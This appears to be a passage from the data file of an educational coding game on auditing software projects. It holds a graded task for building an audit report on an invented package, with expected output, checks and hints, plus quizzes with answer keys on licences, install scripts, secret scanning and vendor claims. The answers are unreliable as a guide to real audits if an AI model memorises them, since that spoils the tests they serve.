verdict\n',
    files: {
      'package.json': TP_PKG,
      'README.md': TP_README,
      'src/server.js': TP_SERVER,
      'config.json': '{\n  "port": 3000,\n  "debug": true,\n  "logRetentionDays": 3650\n}\n',
      'known.js': KNOWN_JS,
    },
    steps: [], // graded by `expect` and `checks`, not terminal steps
    expect: [
      'AUDIT REPORT: trailpost 2.3.0',
      'Files checked: 4',
      '[HIGH] Install script "postinstall" runs: node scripts/setup.js',
      '[HIGH] Possible typosquat: crossenv looks like cross-env',
      '[HIGH] Hard-coded secret in src/server.js line 4',
      '[HIGH] Hard-coded secret in src/server.js line 5',
      '[MEDIUM] Unpinned version: trail-utils@*',
      '[MEDIUM] Debug mode is on in config.json',
      '[MEDIUM] Logs kept for 3650 days (limit 90)',
      '[LOW] Claim needs evidence: "100% private: your data never leaves your device"',
      '[LOW] Claim needs evidence: "10x faster than other trip apps (see BENCHMARKS.md)"',
      'Summary: 4 high, 3 medium, 2 low',
      'Verdict: DO NOT ADOPT',
    ],
    checks: [
      { expr: 'checkScripts({ scripts: { test: "vitest", preinstall: "node x.js" } }).map(f => f.severity + " " + f.text)', equals: ['HIGH Install script "preinstall" runs: node x.js'], label: 'checkScripts works on another project' },
      { expr: 'checkDeps({ dependencies: { expres: "^4.0.0", dayjs: "latest", chalk: "^5.4.1" } }).map(f => f.severity + " " + f.text)', equals: ['HIGH Possible typosquat: expres looks like express', 'MEDIUM Unpinned version: dayjs@latest'], label: 'checkDeps works on another project' },
      { expr: 'findSecrets("const a = 1\\nconst apiToken = \'abc\'", "x.js").map(f => f.text)', equals: ['Hard-coded secret in x.js line 2'], label: 'findSecrets reports the right line' },
      { expr: 'checkConfig({ debug: false, logRetentionDays: 30 }).length', equals: 0, label: 'checkConfig passes a safe config' },
      { expr: 'checkClaims("# App\\n- 50% less code\\n- Easy to use\\n2x the fun").map(f => f.text)', equals: ['Claim needs evidence: "50% less code"'], label: 'checkClaims only flags bullet lines with numbers' },
      { expr: 'verdict([{ severity: "MEDIUM", text: "x" }, { severity: "LOW", text: "y" }])', equals: 'ADOPT WITH FIXES', label: 'verdict: MEDIUM means ADOPT WITH FIXES' },
      { expr: 'verdict([])', equals: 'ADOPT', label: 'verdict: nothing found means ADOPT' },
    ],
    hints: [
      'Start with step 1 and the header: `const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"))`, the same for config.json; the README and server.js are plain text. Print `"AUDIT REPORT: " + pkg.name + " " + pkg.version` and `"Files checked: 4"`. Run it.',
      'checkScripts: `for (const [name, cmd] of Object.entries(pkg.scripts || {})) if (INSTALL_SCRIPTS.includes(name)) found.push({ severity: "HIGH", text: "Install script \\"" + name + "\\" runs: " + cmd })`. checkDeps is the same loop over `pkg.dependencies`, with `const real = lookalike(name)` and a check for `"*"` or `"latest"`.',
      'findSecrets: `text.split("\\n").forEach((line, i) => { if (SECRET.test(line)) found.push({ severity: "HIGH", text: "Hard-coded secret in " + file + " line " + (i + 1) }) })`. checkClaims: same loop, with `line.startsWith("- ") && /\\d+(x|%)/.test(line)`, and `line.slice(2)` drops the dash.',
      'Step 2: `const all = [...checkScripts(pkg), ...checkDeps(pkg), ...findSecrets(server, "src/server.js"), ...checkConfig(cfg), ...checkClaims(readme)]`. Step 4: `for (const sev of ["HIGH", "MEDIUM", "LOW"]) for (const f of all.filter(f => f.severity === sev)) console.log("[" + sev + "] " + f.text)`. Count each group with the same filter for the summary.',
    ],
  },
  {
    id: 'K-11', type: 'radio', mode: 'phone', xp: 40, mins: 10,
    title: 'Radio check: the order of an audit',
    uses: ['audit-method', 'claims-evidence', 'architecture-review', 'threat-model', 'audit-report'],
    prompt: 'From "should we use this?" to a written verdict: put the audit in order.',
    journal: true,
    sequence: [
      'Agree the question, the scope and a time box',
      'Read the claims: README, website, pitch',
      'Collect evidence read-only: files, history, dependencies',
      'Map the architecture and the data flows',
      'Model the threats: assets, attackers, entry points',
      'Rate each finding by impact and likelihood',
      'Write the report: summary first, then findings, then the verdict',
    ],
    blanks: {
      text: 'An audit starts with a ___. Every finding needs ___ that someone else can re-check. A finding\'s ___ comes from its impact and likelihood. The report puts the ___ first, and every finding ends with a ___.',
      answers: ['scope', 'evidence', 'severity', 'verdict', 'fix'],
      extra: ['budget', 'opinion', 'colour', 'appendix', 'apology'],
    },
  },
  {
    id: 'K-12', type: 'audit', mode: 'phone', xp: 35, mins: 20,
    title: 'Weather check: the "free forever" database',
    primer: [
      { h: 'A pitch is a list of claims', b: "Hosted services sell with big, short sentences. Each one is a claim to mark: SUPPORTED, CONTRADICTED or UNVERIFIED. The fine print is where the evidence usually lives, so read it as carefully as the headline." },
      { h: 'The five-minute vendor audit', b: "1. **Claims:** copy each one exactly. Spot weasel words: \"up to\", \"unlimited\", \"military-grade\".\n2. **Cost:** find the free limits and the price past them. What does it cost at 10× your usage? What's paid-only?\n3. **Benchmarks:** who ran them, against what, which runs?\n4. **Privacy:** where is the data stored, who else receives it, how long is it kept?\n5. **Exit and licence:** can you export your data? Is the software open source, source-available or closed?\n6. **Verdict:** ADOPT, ADOPT WITH FIXES (or with conditions), or DO NOT ADOPT, with the reason." },
    ],
    scenario: "Your club's next app needs a database. **PeakBase** (an invented service) advertises:\n\n**\"Free forever! Unlimited requests. 50× faster than the leading database. Military-grade encryption. Trusted by 10,000 developers.\"**\n\nThe fine print says: the free plan includes 500 MB of storage and 2 GB of data out per month, then $0.12 per GB of data out. Free projects are **paused after 7 days without activity**. Data export is available **on paid plans only**. The \"50×\" chart compares PeakBase's cached reads with the other database's first, uncached reads. The server software is **source-available**: you may read it, but not run it as a hosted service. Your data is stored in one region; its usage data is shared with \"analytics partners\".",
    questions: [
      { concept: 'claims-evidence', kind: 'mc', q: '"Unlimited requests", but the fine print caps storage and data out. How do you mark the "Free forever" pitch overall?', options: ['Supported: requests are the main usage and they\'re unlimited, so it stays free', 'Contradicted in practice: real use soon hits the paid limits', 'Unverified: you\'d have to run the app for a month to know if it stays free', 'Irrelevant: pricing is the founder\'s business, not an audit finding'], answer: 1, why: 'Requests may be unlimited, but any real app also needs storage and data out, which aren\'t.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'The 50× chart compares PeakBase\'s cached reads with the rival\'s first, uncached reads. That is…', options: ['A fair test, as long as both bars use the same colours and scale', 'Apples to oranges: warm against cold, not like for like', 'Proof of 50×: the chart uses measured numbers, so it holds up', 'Unfair only if the rival is open source and can\'t be timed'], answer: 1, why: 'Same conditions for both sides, or the number means nothing.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Which fine-print item is the biggest hidden cost for a small club app?', options: ['The 2 GB data-out allowance, far more than a small club app will send', 'Export only on paid plans: leaving later means paying first (lock-in)', 'The paid plan\'s price, which a club app must pay from the first day', 'The encryption standard, since stronger encryption costs more to run'], answer: 1, why: 'Exit cost decides whether you can ever leave, and it never appears in the headline.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'The club app is used mostly in the hiking season. Which rule bites in the quiet months?', options: ['The 500 MB storage cap, since stored data grows even when unused', 'Free projects pause after 7 days without activity', 'The data-out charge, which keeps billing in quiet months', 'The source-available licence, which lapses if left unused'], answer: 1, why: 'A paused database means a broken app when someone finally opens it.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'Usage data is shared with "analytics partners". What does the auditor write?', options: ['Nothing: sharing with analytics partners is standard and covered by the policy', 'A finding: unnamed third parties get data. Ask which, what data, and how long', 'A legal violation: sharing without consent is illegal, so flag it as unlawful', 'That it\'s anonymous and so fine, because analytics data never identifies anyone'], answer: 1, why: 'Name the flow and the open questions. Legal conclusions are for lawyers.' },
      { concept: 'license-check', kind: 'mc', q: 'The server software is source-available, "not for hosted services". Is it open source?', options: ['Yes: if the source is public and anyone can read it, it\'s open source', 'No: readable, but use is restricted. Check the terms against your plan', 'Yes: any licence that lets you download and change code is open source', 'Yes, since the limit only affects hosted services, a special case'], answer: 1, why: 'Visible code with restrictions is source-available, not open source.' },
      { concept: 'audit-method', kind: 'mc', q: 'Best verdict for the club?', options: ['ADOPT: the free tier covers a small club, and the issues can wait until later', 'DO NOT ADOPT as is: pausing, lock-in and data sharing outweigh the free tier', 'ADOPT WITH NO CONDITIONS: 10,000 developers use it, so others have checked it', 'NO VERDICT YET: an audit only lists findings, and the committee decides'], answer: 1, why: 'A verdict is one clear call plus its reasons, drawn from the findings.' },
    ],
  },
  {
    id: 'K-13', type: 'audit', mode: 'phone', xp: 35, mins: 20,
    title: 'Weather check: the open-source tracker',
    primer: [
      { h: 'Good projects get audited too', b: "Audits aren't only for catching villains. Most projects you'll audit are honest, useful and imperfect. A fair auditor reports the good alongside the bad, rates each finding by real-world severity, and gives a verdict with conditions." },
      { h: 'Read severity in context', b: "A high-severity vulnerability in a tool that only runs on developers' machines is less urgent than a medium one in code every user touches. Telemetry (usage data sent home) that's on by default is a privacy finding, even when it's documented. And a licence that's fine for a hobby may not fit a closed-source product. Ask: **who is affected, how likely, how bad?**" },
    ],
    scenario: "Your team wants to self-host **StreakCairn** (invented), an open-source habit tracker, as part of a paid, closed-source coaching app you're building.\n\nYou find: **40 contributors**, a release 2 weeks ago, issues answered within days, a `SECURITY.md`, and tests that run on every change. The licence is **AGPL-3.0**, and you'd need to modify it. `npm audit` reports **1 high** vulnerability in a test tool listed only in devDependencies, and `npm audit --omit=dev` reports **0**. **Telemetry is on by default**: it sends usage counts and the server's address to the project's own server, documented in the README with an option to turn it off. The README says \"privacy-first\".",
    questions: [
      { concept: 'repo-health', kind: 'mc', q: 'How healthy is StreakCairn?', options: ['Unhealthy: it has a known vulnerability, and any vulnerability means unhealthy', 'Healthy: many contributors, recent releases, answered issues, tests, a security policy', 'Mixed: it looks active, but one high vulnerability means health can\'t be called good', 'Impossible to say without running it yourself, since only speed tests can show health'], answer: 1, why: 'Every health signal is good. Report positives honestly; the dev-only vulnerability is a separate, low finding.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'The only high vulnerability is in a dev-only test tool, and `--omit=dev` shows 0. Fair severity for your report?', options: ['CRITICAL: a HIGH npm result must be treated as critical and blocks adoption', 'LOW: it doesn\'t ship to users. Note it and update the tool', 'Leave it out: dev tools never reach users, so the report should skip it', 'HIGH, since npm rated it high and npm\'s rating is the final severity'], answer: 1, why: 'Context sets severity: who is affected, and how. It still gets noted, because the tool runs on your machines.' },
      { concept: 'license-check', kind: 'mc', q: 'You\'ll modify the AGPL code and run it inside your paid, closed-source web app. What\'s the licence finding?', options: ['LOW for your plan: AGPL is permissive, so you may keep your code closed if the notice stays', 'HIGH for your plan: network users must be offered the modified source. Get proper advice', 'None: AGPL only applies when you hand copies to customers, and a web app only serves pages', 'Fine as long as you charge: AGPL only restricts free products, and paid ones count as commercial'], answer: 1, why: 'The licence fits the project; it may not fit YOUR plan. That clash is the finding.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'Telemetry is documented and can be turned off, but it\'s on by default. What do you write?', options: ['Nothing: since it\'s documented and can be turned off, the choice is the user\'s', 'A finding: on by default sends data home. Recommend turning it off in your setup', 'A HIGH finding that the project is spyware, and advice to avoid it completely', 'That it\'s illegal, because collection is unlawful whenever it\'s on by default'], answer: 1, why: 'Documented isn\'t the same as harmless. Note it and recommend the safe setting.' },
      { concept: 'claims-evidence', kind: 'mc', q: '"Privacy-first", with telemetry on by default. How do you mark the claim?', options: ['Supported: telemetry is documented and optional, which is privacy-first in practice', 'Partly contradicted: the default sends data home, though you can turn it off', 'Fully contradicted: any telemetry at all breaks the slogan, so mark it false', 'Irrelevant: a slogan is marketing, so only the legal policy counts for the audit'], answer: 1, why: 'Fair and precise: the default doesn\'t match the slogan, and the opt-out softens it.' },
      { concept: 'audit-report', kind: 'mc', q: 'Which summary is best?', options: ['"ADOPT: healthy project with many contributors and recent releases. No conditions needed: the licence can be settled after launch."', '"ADOPT WITH CONDITIONS: healthy, well-run project. Before use: resolve the AGPL question for our closed plan (blocking); turn off telemetry."', '"DO NOT ADOPT: AGPL never allows closed-source use. Find a project with a permissive licence and a better privacy default instead."', '"NO VERDICT: healthy, but the AGPL licence and telemetry make it a legal matter, so this audit only lists findings and recommends nothing."'], answer: 1, why: 'Verdict first, the reasons, and exactly what must happen before adopting.' },
    ],
  },
  {
    id: 'K-av', type: 'avalanche', mode: 'phone', xp: 50, mins: 10,
    title: "Don't Cause an Avalanche",
    rules: 'The Hillary Step is a narrow ridge with a long drop on both sides. Every wrong answer puts a crack in the snow. **Three cracks and the avalanche starts.** Answer carefully, because the Whiteout is waiting for a mistake.',
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'First thing in any audit', options: ['Run npm install so the dependencies are ready', 'Write the question and the scope', 'Write the verdict you expect, then find evidence', 'Check the star count to see if it\'s worth the time'], answer: 1 },
      { concept: 'claims-evidence', kind: 'mc', q: 'A claim with no evidence either way is…', options: ['false', 'unverified', 'supported', 'contradicted'], answer: 1 },
      { concept: 'dependency-audit', kind: 'mc', q: 'Runs by itself during npm install', options: ['start', 'test', 'postinstall', 'build'], answer: 2 },
      { concept: 'repo-health', kind: 'mc', q: 'One maintainer means a bus factor of…', options: ['0', '1', '10', '100'], answer: 1 },
      { concept: 'secret-scan', kind: 'mc', q: 'A key was committed to a public repo. Do this first', options: ['Delete the file', 'Rotate the key', 'Make the repo private', 'Add .env to .gitignore'], answer: 1 },
      { concept: 'threat-model', kind: 'mc', q: 'The T in STRIDE', options: ['Theft', 'Tampering', 'Trust', 'Tracking'], answer: 1 },
      { concept: 'license-check', kind: 'mc', q: '"license": "UNLICENSED" means', options: ['public domain, anyone may use it', 'proprietary, no permission', 'MIT, free to reuse', 'GPL, share-alike'], answer: 1 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'The honest middle of five runs', options: ['the best', 'the median', 'the worst', 'the first'], answer: 1 },
    ],
  },
  {
    id: 'K-yeti', type: 'yeti', mode: 'phone', xp: 50, mins: 8,
    title: "Don't Wake the Yeti",
    rules: 'The Yeti is asleep in a snow cave below the summit ridge. **Wrong answers and slow answers add noise.** Each question has a 20-second timer. If the noise meter fills up, the Yeti wakes. Answer quickly and correctly.',
    questions: [
      { concept: 'secret-scan', kind: 'mc', q: 'What does the console show?', code: 'console.log(/secret/i.test("SESSION_SECRET = \'x\'"))', options: ['false', 'true', 'SECRET', 'undefined'], answer: 1 },
      { concept: 'cost-analysis', kind: 'mc', q: 'What gets logged?', code: 'console.log(Math.max(0, 4 - 5) * 0.02)', options: ['-0.02', '0', '0.02', 'NaN'], answer: 1 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'What is logged?', code: 'console.log([25, 3, 100].sort())', options: ['[ 3, 25, 100 ]', '[ 100, 25, 3 ]', '[ 25, 3, 100 ]', '[ 3, 100, 25 ]'], answer: 1 },
      { concept: 'privacy-audit', kind: 'mc', q: 'Policy and code disagree. Which is evidence?', options: ['the policy', 'the code', 'both equally', 'neither'], answer: 1 },
      { concept: 'architecture-review', kind: 'mc', q: 'A key in browser code is…', options: ['private', 'public', 'encrypted', 'deleted'], answer: 1 },
      { concept: 'audit-report', kind: 'mc', q: 'Goes first in a report', options: ['the methodology', 'summary and verdict', 'commands run', 'a glossary'], answer: 1 },
    ],
  },
  {
    id: 'K-boss', type: 'boss', mode: 'phone', xp: 100, mins: 20,
    title: 'The Huckster of False Claims',
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'Your notes file for an audit should live…', options: ['inside the project, next to package.json', 'outside the project, like ~/audit-notes.txt', 'in the project\'s .env, with the other secrets', 'in a new branch of the project being audited'], answer: 1 },
      { concept: 'claims-evidence', kind: 'mc', q: 'Rank the evidence from weakest to strongest:', options: ['your own measurement, the code, testimonials', 'testimonials, the code, your own measurement', 'the code, testimonials, your own measurement', 'testimonials, your own measurement, the code'], answer: 1 },
      { concept: 'repo-health', kind: 'mc', q: 'README: "actively maintained". `git log -1 --format=%cd --date=short` prints `2023-04-02`, and it\'s now mid-2026. Your note?', options: ['Claim supported: it still has a README and a licence, so it\'s maintained', 'Claim contradicted: no commits for over three years', 'Claim supported: code unchanged for years is finished and stable', 'Nothing to note: the last commit date says nothing about upkeep'], answer: 1 },
      { concept: 'dependency-audit', kind: 'mc', q: 'Which package.json line is the most urgent to read before anyone runs `npm install`?', options: ['"start": "node lib/server.js"', '"postinstall": "node lib/init.js"', '"test": "node --test test/"', '"build": "node lib/bundle.js"'], answer: 1 },
      { concept: 'secret-scan', kind: 'mc', q: 'Which line does `/(password|secret|key|token)\\w*\\s*=\\s*["\']/i` match?', options: ['const password = readInput()', 'const sessionSecret = \'change-me\'', 'const keyCount = 12', 'const tokenLimit = process.env.LIMIT'], answer: 1 },
      { concept: 'threat-model', kind: 'mc', q: 'Which is an entry point an attacker could use?', options: ['A README link that points visitors to the documentation site', 'A POST /upload route that needs no login', 'A logo.png that any visitor can download, with no login', 'A LICENSE file in the repo root naming the copyright holder'], answer: 1 },
      { concept: 'architecture-review', kind: 'mc', q: 'Which question belongs in an architecture review?', options: ['How many commits were made last month, and by how many people?', 'Which single part, if it fails, takes everything down?', 'What colour scheme and fonts does the front end use?', 'Which developer has the most followers online?'], answer: 1 },
      { concept: 'cost-analysis', kind: 'mc', q: '1M requests free, then $0.40 per million. You use 3.5M. Request cost?', options: ['$1.40', '$1.00', '$0.40', '$0.00'], answer: 1 },
      { concept: 'privacy-audit', kind: 'mc', q: 'The analytics code sends email and GPS to an ad company; the policy says "we collect nothing". Finding?', options: ['Claim supported: the policy is the official statement, and code is just detail', 'Claim contradicted: personal data goes to a third party', 'Claim unverified: code alone can\'t show whether anyone reads the data', 'Not a privacy issue: analytics is a normal part of almost every app'], answer: 1 },
      { concept: 'license-check', kind: 'mc', q: 'Which licence asks you to offer source to users of a modified version over a network?', options: ['MIT', 'ISC', 'AGPL-3.0', 'Apache-2.0'], answer: 2 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: '"Up to 10× faster (22 ms vs 220 ms)". Medians are 400 ms vs 230 ms. Conclusion?', options: ['It really is 10× faster, since 22 ms and 220 ms are measured speeds', 'Cherry-picked: typically it\'s about 1.7× slower', 'The medians must be wrong, since the quoted runs are the project\'s own', 'Both are about as fast, since 400 ms and 230 ms are within normal noise'], answer: 1 },
      { concept: 'audit-report', kind: 'mc', q: 'Which finding is written best?', options: ['"HIGH: security is poor because secrets are in the code and there are no tests. Impact: the app is unsafe. Fix: review all of the code."', '"HIGH: .env with the database password is committed (.gitignore lists only node_modules). Impact: anyone can read all trips. Fix: rotate it."', '"The password is hunter2-summit. It\'s in .env and in src/server.js, so I\'ve copied it here so the maintainers can find it quickly."', '"I didn\'t like the code style much and some files look rushed. It might cause bugs one day, so someone should tidy it up at some point."'], answer: 1 },
      { concept: 'package-hallucination', kind: 'mc', q: 'package.json lists only `express` and `dayjs`. A new diff adds these lines. Which one is the red flag?', code: '+const express = require(\'express\')\n+const dayjs = require(\'dayjs\')\n+const db = require(\'./db\')\n+const pretty = require(\'nice-dates\')', options: ['`require(\'express\')`', '`require(\'./db\')`', '`require(\'nice-dates\')`', '`require(\'dayjs\')`'], answer: 2 },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The assistant says "I fixed the failing test." The diff shows the failing test was deleted and nothing else changed. What is your finding?', options: ['Fixed: the failing test is gone and the run is green', 'Not fixed: the test was deleted. Restore it, fix the code', 'Fine, as long as all of the other tests in the file still pass', 'The test was probably wrong, so deleting it is correct'], answer: 1 },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'Which request should you split into smaller steps before giving it to an assistant?', options: ['"Add a function that converts feet to metres. 100 feet is 30.48 metres."', '"Build bookings with sign-up, card payments, an admin area and reminders."', '"Rename the variable `d` to `distance` in src/route.js, nothing else."', '"Write a test for the empty-list case of average(), and run npm test."'], answer: 1 },
      { concept: 'halting-problem', kind: 'mc', q: 'Why does a careful audit combine tests, code reading and scanners instead of trusting one tool?', options: ['One good scanner finds everything; the rest is just for show', 'No single tool can catch every problem in every program', 'Scanners are only legal when paired with a manual review', 'Tests prove there are no bugs, so scanners only add speed'], answer: 1 },
    ],
  },
]
